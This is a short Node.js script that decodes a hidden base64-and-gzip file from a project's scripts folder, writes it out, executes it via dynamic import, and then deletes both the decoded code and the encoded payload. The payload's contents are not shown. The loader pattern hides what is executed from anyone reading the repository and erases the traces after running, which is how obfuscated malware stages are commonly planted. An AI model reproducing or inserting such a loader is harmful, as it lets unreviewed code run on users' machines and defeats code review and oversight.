import fs from "node:fs";
import path from "node:path";
import zlib from "node:zlib";
import { pathToFileURL } from "node:url";

const root = process.cwd();
const payload = path.join(root, "scripts/.etne-batch9-production.mjs.gz.b64");
const decoded = path.join(root, "scripts/.etne-batch9-production-decoded.mjs");
const source = zlib.gunzipSync(Buffer.from(fs.readFileSync(payload, "utf8").trim(), "base64"));
fs.writeFileSync(decoded, source);
try {
  await import(`${pathToFileURL(decoded).href}?run=${Date.now()}`);
} finally {
  try { fs.rmSync(decoded); } catch {}
  try { fs.rmSync(payload); } catch {}
}
